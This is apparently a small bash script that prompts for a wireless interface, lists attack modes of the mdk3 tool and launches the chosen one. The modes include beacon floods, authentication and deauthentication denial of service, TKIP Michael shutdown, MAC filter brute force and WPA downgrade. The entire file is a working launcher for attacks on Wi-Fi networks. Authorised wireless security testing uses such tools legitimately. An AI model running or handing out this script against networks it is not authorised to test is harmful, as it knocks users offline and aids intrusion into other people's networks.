read -p 'what interface are you going to use for the attack? ' MONFACE

echo 'These are the attacks:'
echo 'b   - Beacon Flood Mode'
echo 'a   - Authentication DoS mode'
echo 'p   - Basic probing and ESSID Bruteforce mode'
echo 'd   - Deauthentication / Disassociation Amok Mode'
echo 'm   - Michael shutdown exploitation (TKIP)'
echo 'x   - 802.1X tests'
echo 'w   - WIDS/WIPS Confusion'
echo 'f   - MAC filter bruteforce mode'
echo 'g   - WPA Downgrade test'

read -p 'What attack do you want to use? ' ATTACKMODE

echo 'starting attack...'

mdk3 $MONFACE $ATTACKMODE 

